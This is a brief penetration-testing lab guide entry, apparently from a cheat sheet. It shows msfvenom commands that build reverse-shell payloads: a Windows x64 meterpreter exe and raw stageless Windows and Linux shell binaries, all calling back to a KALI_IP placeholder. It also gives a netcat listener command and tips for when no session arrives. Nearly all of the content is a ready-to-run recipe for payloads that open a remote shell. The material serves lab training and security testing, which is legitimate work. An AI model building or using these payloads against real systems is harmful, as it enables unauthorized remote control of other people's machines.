## Generate a Windows lab payload with explicit callback settings

**Run in:** Kali. **Requires:** An x64 Windows lab target, a reachable callback address and a matching handler planned on Kali; this command generates a file only.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o lab-payload.exe
```

**What the result establishes:** Match payload platform, architecture, staged/stageless choice, output format and handler configuration.

**Next check:** Check architecture, execution path, endpoint policy, callback route and handler payload type independently.

## Commands

**Kali**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f elf -o shell.elf
```

These are raw stageless shells: listen on Kali with sudo nc -lvnp 443. Meterpreter payloads need a matching Metasploit handler instead.

## If it fails

| Symptom | Check |
| --- | --- |
| Generation succeeds but execution produces no session | LHOST must be reachable from the target. Producing a file does not prove it runs on the target or matches the receiving handler. |
